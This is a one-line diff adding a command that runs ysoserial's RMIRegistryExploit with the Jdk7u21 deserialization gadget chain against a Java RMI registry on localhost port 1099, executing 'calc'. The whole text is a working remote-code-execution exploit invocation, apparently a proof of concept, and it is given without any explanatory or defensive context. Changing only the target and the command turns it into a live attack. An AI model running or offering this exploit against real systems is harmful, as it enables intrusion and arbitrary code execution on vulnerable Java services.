@@ -1,0 +1,1 @@
+java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 Jdk7u21 "calc"
